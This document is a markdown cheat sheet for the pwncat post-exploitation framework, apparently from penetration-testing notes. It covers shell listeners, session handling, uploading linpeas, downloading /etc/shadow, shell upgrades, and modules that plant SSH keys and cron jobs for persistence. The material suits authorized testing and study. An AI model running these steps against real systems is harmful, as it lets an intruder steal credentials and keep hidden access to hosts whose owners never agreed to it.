# pwncat

**Tags:** `#pwncat` `#shells` `#remoteaccess` `#postexploit` `#linux`

Post-exploitation framework built around a reverse/bind shell handler. Automatically upgrades shells to fully interactive PTYs, handles file upload/download, runs local scripts, and provides a persistent session manager. Linux-focused.

**Source:** https://github.com/calebstewart/pwncat
**Install:** `pip install pwncat-cs` or `pipx install pwncat-cs`

```bash
# Start listener
pwncat-cs -lp 4444
```

> [!note]
> When a shell connects, pwncat automatically upgrades it to a full PTY. Use `Ctrl+D` to send EOF or `Ctrl+C` to background the remote shell and drop to the pwncat local prompt. Type `help` for available commands.

---

## Starting a Listener

```bash
# TCP listener
pwncat-cs -lp 4444

# Bind to specific interface
pwncat-cs -lp 4444 --host 0.0.0.0

# Connect to existing bind shell
pwncat-cs 10.129.14.128:4444
```

---

## Session Navigation

```bash
# In remote shell — background and go to local prompt
Ctrl+D

# Back to remote shell from local prompt
(local) connect     # if only one session
(local) sessions    # list sessions
(local) sessions 0  # interact with session 0
```

---

## File Transfer

```bash
# From local prompt — upload to target
(local) upload /local/path/linpeas.sh /tmp/linpeas.sh

# Download from target
(local) download /etc/shadow /local/shadow.txt

# Upload and run
(local) upload /local/linpeas.sh /tmp/linpeas.sh
(remote) chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

---

## Built-in Modules

```bash
# From local prompt
(local) run enumerate.system.users   # enumerate users
(local) run enumerate.system.network # network interfaces
(local) run enumerate.gather         # run all enumeration
(local) run implant.ssh              # plant SSH key for persistence
(local) run persist.cron             # cron persistence
```

---

## Shell Upgrade

pwncat handles TTY upgrade automatically. If connecting to a plain nc listener, it runs:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# + stty/TERM fixes
```

Manual upgrade (when not using pwncat):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160
```

---

## Reconnect / Persistence

```bash
# pwncat can maintain reconnect scripts
# From local prompt after implanting SSH key:
(local) run implant.ssh

# Reconnect via SSH next time
pwncat-cs ssh://user@10.129.14.128
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
